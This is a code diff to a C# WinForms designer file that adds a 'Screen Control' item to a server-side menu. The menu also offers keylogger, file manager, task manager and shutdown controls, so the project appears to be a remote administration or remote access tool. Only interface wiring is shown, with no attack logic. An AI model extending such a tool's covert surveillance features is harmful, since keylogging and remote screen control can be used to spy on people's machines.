@@ -57,6 +57,7 @@ namespace Server.Forms
             messageBoxToolStripMenuItem = new ToolStripMenuItem();
             fileManagerToolStripMenuItem = new ToolStripMenuItem();
             taskManagerToolStripMenuItem = new ToolStripMenuItem();
+            screenControlToolStripMenuItem = new ToolStripMenuItem();
             keyLoggerToolStripMenuItem = new ToolStripMenuItem();
             keyLoggerStartParallelToolStripMenuItem = new ToolStripMenuItem();
             keyLoggerStartContinuousToolStripMenuItem = new ToolStripMenuItem();
@@ -184,6 +185,7 @@ namespace Server.Forms
                 messageBoxToolStripMenuItem,
                 fileManagerToolStripMenuItem,
                 taskManagerToolStripMenuItem,
+                screenControlToolStripMenuItem,
                 keyLoggerToolStripMenuItem,
                 shutdownActionToolStripMenuItem,
                 userManagementToolStripMenuItem
@@ -240,6 +242,12 @@ namespace Server.Forms
             taskManagerToolStripMenuItem.Size = new Size(200, 24);
             taskManagerToolStripMenuItem.Text = "Task Manager";
             taskManagerToolStripMenuItem.Click += taskManagerToolStripMenuItem_Click;
+
+            // screenControlToolStripMenuItem
+            screenControlToolStripMenuItem.Name = "screenControlToolStripMenuItem";
+            screenControlToolStripMenuItem.Size = new Size(200, 24);
+            screenControlToolStripMenuItem.Text = "Screen Control";
+            screenControlToolStripMenuItem.Click += screenControlToolStripMenuItem_Click;
 
             // keyLogger items (from main)
             keyLoggerToolStripMenuItem.Name = "keyLoggerToolStripMenuItem";
@@ -385,6 +393,7 @@ namespace Server.Forms
         private ToolStripMenuItem messageBoxToolStripMenuItem;
         private ToolStripMenuItem fileManagerToolStripMenuItem;
         private ToolStripMenuItem taskManagerToolStripMenuItem;
+        private ToolStripMenuItem screenControlToolStripMenuItem;
         private ToolStripMenuItem keyLoggerToolStripMenuItem;
         private ToolStripMenuItem keyLoggerStartParallelToolStripMenuItem;
         private ToolStripMenuItem keyLoggerStartContinuousToolStripMenuItem;
